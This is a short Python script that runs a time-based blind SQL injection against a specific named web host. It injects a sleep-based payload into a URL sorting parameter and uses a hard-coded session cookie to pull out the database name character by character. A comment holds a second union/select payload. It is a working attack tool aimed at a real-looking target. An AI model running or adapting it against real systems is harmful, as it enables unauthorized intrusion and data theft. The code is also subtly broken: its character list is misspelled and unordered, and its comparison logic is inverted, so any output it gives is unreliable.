# coding: utf-8
# union/**/select/**/substr(database(){0},1)regexp(\'{}\')
import requests
import time

# database = 15

url_1 = 'https://cdp-app-dev.smart.cn/loyaltyv2/settings/registerPage?needTotal=true&page=1&rows=10&sidx=lastUpdated&sord=desc,(if(ascii(substr(database(),{0},1))>{1},1,sleep(3)))'

chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'

headers = {
    "Cookie": "SESSION=fec304a4-5797-4346-8d80-c53df2f127b8",
    "Sec-Ch-Ua": 'Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7",
    "Connection": "close",
}

database = ''

length = 15
for i in range(1, length + 1):
    for char in chars:
        charAscii = ord(char)  # char转换为ascii
        url = 'https://cdp-app-dev.smart.cn/loyaltyv2/settings/registerPage?needTotal=true&page=1&rows=10&sidx=lastUpdated&sord=desc,(if(ascii(substr(database(),{0},1))>{1},1,sleep(3)))'
        urlformat = url.format(i, charAscii)
        start_time = time.time()
        requests.get(urlformat, headers=headers)
        if time.time() - start_time > 2:
            database += char
            print('database: ', database)
            break
        else:
            pass
print('database is ' + database)
